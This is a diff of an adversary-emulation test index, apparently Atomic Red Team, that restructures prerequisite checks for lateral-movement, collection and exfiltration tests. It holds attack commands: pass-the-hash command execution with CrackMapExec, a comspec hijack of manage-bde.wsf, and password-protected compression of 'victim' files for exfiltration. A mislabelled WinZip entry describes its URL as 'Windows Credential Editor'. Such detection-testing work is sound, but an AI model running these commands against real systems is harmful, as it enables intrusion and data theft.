         command: |
           set comspec=#{command_to_execute}
           cscript manage-bde.wsf
@@ -24816,13 +24942,20 @@ lateral-movement:
           description: command to execute
           type: string
           default: whoami
+        crackmapexec_exe:
+          description: crackmapexec windows executable
+          type: Path
+          default: C:\CrackMapExecWin\crackmapexec.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: CrackMapExec executor must exist on disk at specified location
+          (#{crackmapexec_exe})
+        prereq_command: 'if(Test-Path #{crackmapexec_exe}) { 0 } else { -1 }'
+        get_prereq_command: 'Write-Host Automated installer not implemented yet, please
+          install crackmapexec manually at this location: #{crackmapexec_exe}'
       executor:
         name: command_prompt
         elevation_required: false
-        prereq_command: 'powershell -c if(Test-Path C:\CrackMapExecWin\crackmapexec.exe)
-          { 0 } else { -1 }
-
-'
         command: "crackmapexec #{domain} -u #{user_name} -H #{ntlm} -x #{command}
           \n"
   T1097:
@@ -25007,13 +25140,15 @@ lateral-movement:
           description: Username argument default %USERDOMAIN%\%username%
           type: String
           default: "$Env:USERDOMAIN\\$ENV:USERNAME"
+      dependencies:
+      - description: Computer must be domain joined
+        prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
+          {0} else {1}
+        get_prereq_command: Write-Host Joining this computer to a domain must be done
+          manually
       executor:
         name: powershell
         elevation_required: false
-        prereq_command: 'if((Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain)
-          {0} else {1}
-
-'
         command: 'Connect-RDP -ComputerName #{logonserver} -User #{username}
 
 '
@@ -25737,10 +25872,6 @@ collection:
       executor:
         name: powershell
         elevation_required: false
-        prereq_command: 'if(Get-Command WindowsAudioDevice-Powershell-Cmdlet -errorAction
-          SilentlyContinue) {0} else {1}
-
-'
         command: 'powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet
 
 '
@@ -26567,16 +26698,31 @@ exfiltration:
           description: Path where resulting compressed data should be placed
           type: Path
           default: "%USERPROFILE%\\data.rar"
+        rar_installer:
+          description: Winrar installer
+          type: Path
+          default: "%TEMP%\\winrar.exe"
+        rar_exe:
+          description: The RAR executable from Winrar
+          type: Path
+          default: "%programfiles%/WinRAR/Rar.exe"
+      dependencies:
+      - description: Rar tool must be installed at specified location (#{rar_exe})
+        prereq_command: if not exist "#{rar_exe}" (exit /b 1)
+        get_prereq_command: |-
+          echo Downloading Winrar installer
+          bitsadmin /transfer myDownloadJob /download /priority normal "https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe" #{rar_installer}
+          echo Follow the installer prompts to install Winrar
+          #{rar_installer}
       executor:
         name: command_prompt
         elevation_required: false
-        prereq_command: 'rar /?
+        command: '"#{rar_exe}" a -r #{output_file} #{input_path} *#{file_extension}
 
 '
-        command: 'rar a -r #{output_file} #{input_path} *#{file_extension}
+        cleanup_command: 'del #{output_file}
 
 '
-        cleanup_command: del -f
     - name: Data Compressed - nix - zip
       description: 'An adversary may compress data (e.g., sensitive documents) that
         is collected prior to exfiltration. This test uses standard zip compression.
@@ -26595,16 +26741,23 @@ exfiltration:
           description: Path that should be output as a zip archive
           type: Path
           default: "$HOME/data.zip"
+      dependencies:
+      - description: Files to zip must exist (#{input_files})
+        prereq_command: 'ls #{input_files}'
+        get_prereq_command: echo Please set input_files argument to include files
+          that exist
       executor:
         name: sh
         elevation_required: false
-        prereq_command: 'ls #{input_file}
+        prereq_command: 'ls #{input_files} > /dev/null
 
 '
         command: 'zip #{output_file} #{input_files}
 
 '
-        cleanup_command: rm -f
+        cleanup_command: 'rm -f #{output_file}
+
+'
     - name: Data Compressed - nix - gzip Single File
       description: 'An adversary may compress data (e.g., sensitive documents) that
         is collected prior to exfiltration. This test uses standard gzip compression.
@@ -26650,12 +26803,14 @@ exfiltration:
           description: File that should be output
           type: Path
           default: "$HOME/data.tar.gz"
+      dependencies:
+      - description: Folder to zip must exist (#{input_file_folder})
+        prereq_command: 'test -e #{input_file_folder}'
+        get_prereq_command: echo Please set input_file_folder argument to a folder
+          that exists
       executor:
         name: sh
         elevation_required: false
-        prereq_command: 'test -e #{input_file_folder}
-
-'
         command: 'tar -cvzf #{output_file} #{input_file_folder}
 
 '
@@ -26762,6 +26917,28 @@ exfiltration:
         wzzip sample.zip -s"blueblue" *.txt (VARIANT)
       supported_platforms:
       - windows
+      input_arguments:
+        winzip_exe:
+          description: Path to installed Winzip executable
+          type: Path
+          default: "%ProgramFiles%\\WinZip\\winzip64.exe"
+        winzip_url:
+          description: Path to download Windows Credential Editor zip file
+          type: url
+          default: https://download.winzip.com/gl/nkln/winzip24-home.exe
+        winzip_hash:
+          description: File hash of the Windows Credential Editor zip file
+          type: String
+          default: B59DB592B924E963C21DA8709417AC0504F6158CFCB12FE5536F4A0E0D57D7FB
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Winzip must be installed
+        prereq_command: cmd /c 'if not exist "#{winzip_exe}" (echo 1) else (echo 0)'
+        get_prereq_command: |-
+          if(Invoke-WebRequestVerifyHash "#{winzip_url}" "$env:Temp\winzip.exe" #{winzip_hash}){
+            Write-Host Follow the installation prompts to continue
+            cmd /c "$env:Temp\winzip.exe"
+          }
       executor:
         name: command_prompt
         elevation_required: false
@@ -26770,7 +26947,7 @@ exfiltration:
           mkdir .\tmp\victim-files
           cd .\tmp\victim-files
           echo "This file will be encrypted" > .\encrypted_file.txt
-          winzip32 -min -a -s"hello" archive.zip *
+          "#{winzip_exe}" -min -a -s"hello" archive.zip *
           dir
     - name: Compress Data and lock with password for Exfiltration with 7zip
       description: 'Note: Requires 7zip installation
@@ -26839,8 +27016,6 @@ exfiltration:
 '
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       executor:
         name: sh
@@ -26916,8 +27091,6 @@ exfiltration:
         Remote to Local
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       input_arguments:
         domain:
@@ -26945,8 +27118,6 @@ exfiltration:
         Local to Remote
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       input_arguments:
         domain:
@@ -26975,8 +27146,6 @@ exfiltration:
 '
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       executor:
         name: manual
